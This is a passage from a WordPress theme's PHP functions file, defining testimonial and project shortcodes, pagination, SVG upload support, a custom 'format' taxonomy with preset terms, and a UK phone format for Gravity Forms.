								echo '<p class="fa fa-star" style="'.$color.'"></p>';
							}
							?>
						</div>
						<span class="name"><?php echo get_field('testimonial_name',$testimonial->ID); ?></span>
						<span class="title"><?php echo get_the_title($testimonial->ID); ?></span>
					</div>
				<?php } ?>
			</div>
			<div id="testm-counter"></div>
		
	<?php	
	}
}
add_shortcode('testimonial-shortcode','testimonialShortcode');

function projectShortcode(){
	$projects = new WP_Query(
        array(
            'post_type' => 'projects',
            'posts_per_page' => 9,
            'post_status' => 'publish',
        )
    );
	if( !empty(count($projects->posts)) ){ ?>
		<div class="projects-grid">
			<?php foreach( $projects->posts as $project ){ ?>
				<div class="item">
					<a href="<?php if( !empty( get_field('enable_link',$project->ID) ) ){ echo get_the_permalink($project->ID); }else{ echo 'javascript:void(0)'; } ?>">
						<div class="img-box">
							<?php $projectImage = wp_get_attachment_image_src( get_post_thumbnail_id( $project->ID ), 'project-image' ); ?>
							<img src="<?php echo $projectImage[0]; ?>">	
						</div>
						<h3><?php echo get_the_title($project->ID); ?></h3>
					</a>
				</div>					
			<?php } ?>			
		</div>
	<?php	
	}
}
add_shortcode('project-shortcode','projectShortcode');

function pagination_bar( $custom_query ) {

    $total_pages = $custom_query->max_num_pages;
    $big = 999999999; // need an unlikely integer

    if ($total_pages > 1){
        $current_page = max(1, get_query_var('paged'));

        echo paginate_links(array(
            'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
            'format' => '?paged=%#%',
            'current' => $current_page,
            'total' => $total_pages,
        ));
    }
}

function add_svg_to_upload_mimes( $upload_mimes ) { 
	$upload_mimes['svg'] = 'image/svg+xml'; 
	$upload_mimes['svgz'] = 'image/svg+xml'; 
	return $upload_mimes; 
} 
add_filter( 'upload_mimes', 'add_svg_to_upload_mimes', 10, 1 );


//========================= Categories for Portfolio Custom Type ===========================//

// function faq_categories_taxonomy() {
//   register_taxonomy('faq_category',array('faq'), array(
//     'hierarchical' => true,
//     'show_ui' => true,
//     'show_admin_column' => true,
// 	'show_in_rest' => true,
//     'query_var' => true,
//     'rewrite' => array( 
// 			'slug' => 'faq_category',
// 			'with_front' => true,
// 	),
//   ));
 
// }
// add_action( 'init', 'faq_categories_taxonomy', 0 );

add_theme_support( 'post-formats', array( 'image', 'quote', 'video' ) );


// hook into the init action and call custom_post_formats_taxonomies when it fires
add_action( 'init', 'custom_post_formats_taxonomies', 0 );


// create a new taxonomy we're calling 'format'
function custom_post_formats_taxonomies() {
	// Add new taxonomy, make it hierarchical (like categories)
	$labels = array(
		'name'              => _x( 'Formats', 'taxonomy general name', 'textdomain' ),
		'singular_name'     => _x( 'Format', 'taxonomy singular name', 'textdomain' ),
		'search_items'      => __( 'Search Formats', 'textdomain' ),
		'all_items'         => __( 'All Formats', 'textdomain' ),
		'parent_item'       => __( 'Parent Format', 'textdomain' ),
		'parent_item_colon' => __( 'Parent Format:', 'textdomain' ),
		'edit_item'         => __( 'Edit Format', 'textdomain' ),
		'update_item'       => __( 'Update Format', 'textdomain' ),
		'add_new_item'      => __( 'Add New Format', 'textdomain' ),
		'new_item_name'     => __( 'New Format Name', 'textdomain' ),
		'menu_name'         => __( 'Format', 'textdomain' ),
	);

	$args = array(
		'hierarchical'      => true,
		'labels'            => $labels,
		'show_ui'           => true,
		'show_admin_column' => true,
		'query_var'         => true,
		'rewrite'           => array( 'slug' => 'project-type' ),
		'capabilities' => array(
			'manage_terms' => '',
			'edit_terms' => '',
			'delete_terms' => '',
			'assign_terms' => 'edit_posts'
		),
		'public' => true,
		'show_in_nav_menus' => false,
		'show_in_rest' => true,
		'show_tagcloud' => false,
	);
	register_taxonomy( 'format', array( 'projects' ), $args ); // our new 'format' taxonomy
}

// programmatically create a few format terms
function example_insert_copywriting_format() { // later we'll define this as our default, so all posts have to have at least one format
	wp_insert_term(
		'Copywriting',
		'format',
		array(
		  'description'	=> '',
		  'slug' 		=> 'copywriting'
		)
	);
}
add_action( 'init', 'example_insert_copywriting_format' );

// repeat the following 11 lines for each format you want
function example_insert_web_design_format() {
	wp_insert_term(
		'Web Design', // change this to
		'format',
		array(
		  'description'	=> '',
		  'slug' 		=> 'web-design'
		)
	);
}
add_action( 'init', 'example_insert_web_design_format' );

function example_insert_support_format() {
	wp_insert_term(
		'Support', // change this to
		'format',
		array(
		  'description'	=> '',
		  'slug' 		=> 'support'
		)
	);
}
add_action( 'init', 'example_insert_support_format' );

function example_insert_social_media_format() {
	wp_insert_term(
		'Social Media Marketing', // change this to
		'format',
		array(
		  'description'	=> '',
		  'slug' 		=> 'social-media-marketing'
		)
	);
}
add_action( 'init', 'example_insert_social_media_format' );

// make sure there's a default Format type and that it's chosen if they didn't choose one
function moseyhome_default_format_term( $post_id, $post ) {
    if ( 'publish' === $post->post_status ) {
        $defaults = array(
            'format' => 'default' // change 'default' to whatever term slug you created above that you want to be the default
            );
        $taxonomies = get_object_taxonomies( $post->post_type );
        foreach ( (array) $taxonomies as $taxonomy ) {
            $terms = wp_get_post_terms( $post_id, $taxonomy );
            if ( empty( $terms ) && array_key_exists( $taxonomy, $defaults ) ) {
                wp_set_object_terms( $post_id, $defaults[$taxonomy], $taxonomy );
            }
        }
    }
}
add_action( 'save_post', 'moseyhome_default_format_term', 100, 2 );

// replace checkboxes for the format taxonomy with radio buttons and a custom meta box

add_filter( 'gform_phone_formats', 'uk_phone_format' );
function uk_phone_format( $phone_formats ) {
    $phone_formats['uk'] = array(
        'label'       => 'UK',
		'mask'        => '+44 9999 999999 99999',
        'regex'       => '/^(((\+44\s?\d{4}|\(?0\d{4}\)?)\s?\d{3}\s?\d{3})|((\+44\s?\d{3}|\(?0\d{3}\)?)\s?\d{3}\s?\d{4})|((\+44\s?\d{2}|\(?0\d{2}\)?)\s?\d{4}\s?\d{4}))(\s?\#(\d{4}|\d{3}))?$/',
        'instruction' => false,
    );
 
    return $phone_formats;
}


?>
